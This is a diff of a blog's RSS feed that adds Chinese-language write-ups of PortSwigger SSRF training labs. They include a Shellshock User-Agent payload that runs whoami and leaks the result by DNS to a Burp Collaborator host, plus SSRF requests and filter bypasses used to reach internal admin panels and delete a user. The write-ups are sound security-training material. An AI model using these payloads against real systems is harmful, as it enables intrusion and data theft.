@@ -1,4 +1,123 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Terminal</title><link>/</link><description>Recent content on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 28 Nov 2024 23:21:04 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: File path traversal, validation of file extension with null byte bypass</title><link>/posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</link><pubDate>Thu, 28 Nov 2024 23:21:04 +0800</pubDate><guid>/posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Terminal</title><link>/</link><description>Recent content on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 30 Nov 2024 18:37:38 +0800</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: Blind SSRF with Shellshock exploitation</title><link>/posts/ssrf-lab-shellshock-exploitation/</link><pubDate>Sat, 30 Nov 2024 18:37:38 +0800</pubDate><guid>/posts/ssrf-lab-shellshock-exploitation/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-shellshock-exploitation-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>同&lt;a href="/posts/ssrf-lab-out-of-band-detection/">前题&lt;/a>，使用Burp Collaborator作为带外信息收集&lt;/li>
+&lt;li>此题建议使用&lt;a href="https://blog.cloudflare.com/inside-shellshock/">Shellshock&lt;/a>执行系统命令获得OS用户&lt;/li>
+&lt;li>在&lt;code>User-Agent&lt;/code>请求头写入Shellshock payload，在&lt;code>Referer&lt;/code>请求头指定内部服务器地址&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>GET /product?productId=8 HTTP/2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: 0a8c00a60471f6ef82a26f06005400ee.web-security-academy.net
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent: () { ignored;};/usr/bin/nslookup $(whoami).g9qshqvqxiflz8z00kvd9oxt5kbcz4nt.oastify.com
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer: http://192.168.0.xxx:8080
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>使用Burp Intruder遍历内部服务器地址(&lt;code>Referer&lt;/code>请求头)&lt;/li>
+&lt;li>回到Burp Collaborator观察即可获得OS用户(peter-PjP23W)，提交至页面后结束
+&lt;img alt="DNS query" src="/img/ssrf-lab-shellshock-exploitation-2.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Blind SSRF with out-of-band detection</title><link>/posts/ssrf-lab-out-of-band-detection/</link><pubDate>Sat, 30 Nov 2024 18:23:28 +0800</pubDate><guid>/posts/ssrf-lab-out-of-band-detection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-out-of-band-detection-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>此题目的是让用户熟悉Burp Collaborator如何使用&lt;/li>
+&lt;li>首先在Burp -&amp;gt; Collaborator -&amp;gt; 点击Copy to clipboard&lt;/li>
+&lt;li>将上步获得的url替换请求中的Referer，例如&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>GET /product?productId=1 HTTP/2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer: https://3qufydcde5w8gvgnh7c0qbegm7sygp4e.oastify.com
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>发送请求后在Collaborator面板即可观察到相关信息&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with filter bypass via open redirection vulnerability</title><link>/posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</link><pubDate>Sat, 30 Nov 2024 15:55:02 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-filter-bypass-via-open-redirection/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-filter-bypass-via-open-redirection-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>&lt;/li>
+&lt;li>直接在请求体中设置&lt;code>http://192.168.0.12:8080/admin&lt;/code>会获得错误&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>HTTP/2 400 Bad Request
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/json; charset=utf-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options: SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 48
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid external stock check url &amp;#39;Invalid URL&amp;#39;&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>观察页面下方有&lt;code>Next product&lt;/code>按钮，对应请求为&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>GET /product/nextProduct?currentProductId=1&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>path=/product?productId=2 HTTP/2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol>
+&lt;li>点击按钮后，页面将跳转至path参数地址，即为&lt;code>/product?productId=2&lt;/code>，利用此特性，将请求体设置为&lt;code>/product/nextProduct?currentProductId=1&amp;amp;path=&lt;/code>，后面接上目的地址，最终url请求体为&lt;code>%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a%2f%2f192.168.0.12%3a8080%2fadmin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.12:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with whitelist-based input filter</title><link>/posts/ssrf-lab-ssrf-with-whitelist-filter/</link><pubDate>Sat, 30 Nov 2024 15:19:16 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-with-whitelist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-whitelist-filter-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了1个防止SSRF的防御措施&lt;/li>
+&lt;li>若将请求体设置为&lt;code>http://localhost/admin&lt;/code>会获得以下返回&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>HTTP/2 400 Bad Request
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/json; charset=utf-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options: SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 58
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;External stock check host must be stock.weliketoshop.net&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>最终尝试到请求体为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: SSRF with blacklist-based input filter</title><link>/posts/ssrf-lab-ssrf-with-blacklist-filter/</link><pubDate>Sat, 30 Nov 2024 14:51:44 +0800</pubDate><guid>/posts/ssrf-lab-ssrf-with-blacklist-filter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-ssrf-with-blacklist-filter-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题部署了2个简单的防止SSRF的防御措施&lt;/li>
+&lt;li>2个简单的防止SSRF的防御措施分别在&lt;code>localhsot&lt;/code>以及&lt;code>admin&lt;/code>
+&lt;ul>
+&lt;li>&lt;code>localhsot&lt;/code>可以替换为&lt;code>lOcAlHost&lt;/code>或&lt;code>127.0.0.1&lt;/code>的变形，例如&lt;code>2130706433&lt;/code>、&lt;code>017700000001&lt;/code>、&lt;code>127.1. &lt;/code>&lt;/li>
+&lt;li>&lt;code>admin&lt;/code>使用大小写绕过，例如&lt;code>Admim&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>最终请求体为&lt;code>http://127.1/Admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://127.1/Admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against another back-end system</title><link>/posts/ssrf-lab-basic-ssrf-against-backend-system/</link><pubDate>Sat, 30 Nov 2024 11:47:06 +0800</pubDate><guid>/posts/ssrf-lab-basic-ssrf-against-backend-system/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-backend-system-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>目标入口同&lt;a href="/posts/ssrf-lab-basic-ssrf-against-localhost/">前题&lt;/a>，但此题需要自行寻找admin interface&lt;/li>
+&lt;li>使用Burp suite Intruder功能，自动遍历题目给出的范围&lt;code>192.168.0.x&lt;/code>，请求体为&lt;code>stockApi=http://192.168.0.§1§:8080/admin&lt;/code>，Number range从0至254&lt;/li>
+&lt;li>根据扫描结果，在参数为&lt;code>58&lt;/code>时获得response code 200，所以admin interface为&lt;code>http://192.168.0.58:8080/admin&lt;/code>，将请求体修改并发送后得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>http://192.168.0.58:8080/admin/delete?username=carlos&lt;/code>，将请求体修改为此url后即可达成目的&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Basic SSRF against the local server</title><link>/posts/ssrf-lab-basic-ssrf-against-localhost/</link><pubDate>Sat, 30 Nov 2024 10:52:18 +0800</pubDate><guid>/posts/ssrf-lab-basic-ssrf-against-localhost/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/ssrf-lab-basic-ssrf-against-localhost-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任一个商品(View details)进入到商品详细页面，每个页面最底下有题目中提到的查看库存功能，点击按钮后可以查看不同地区的库存情况&lt;img alt="stock check feature" src="/img/ssrf-lab-basic-ssrf-against-localhost-2.jpg">&lt;/li>
+&lt;li>查看库存对应的请求内容与返回如下&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>POST /product/stock HTTP/2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: 0a82001403d00c83834cf749008e00de.web-security-academy.net
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 107
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>HTTP/2 200 OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: text/plain; charset=utf-8
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options: SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>831
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>观察上述请求与返回，可以猜测后端逻辑为请求&lt;code>http://stock.weliketoshop.net:8080&lt;/code>并带上对应参数后将库存数量返回&lt;/li>
+&lt;li>修改&lt;code>stockApi&lt;/code>参数值为题目要求的&lt;code>http://localhost/admin&lt;/code>&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>POST /product/stock HTTP/2
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: 0a82001403d00c83834cf749008e00de.web-security-academy.net
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: application/x-www-form-urlencoded
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length: 107
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>stockApi=http://localhost/admin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>在返回数据中得知删除用户&lt;code>carlos&lt;/code>的url为&lt;code>/admin/delete?username=carlos&lt;/code>，将此拼接在stockApi后即可达成目的&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: File path traversal, validation of file extension with null byte bypass</title><link>/posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</link><pubDate>Thu, 28 Nov 2024 23:21:04 +0800</pubDate><guid>/posts/file-path-traversal-lab-validate-file-extension-null-byte-bypass/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
 &lt;p>&lt;img alt="Lab description" src="/img/file-path-traversal-lab-validate-file-extension-null-byte-bypass-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
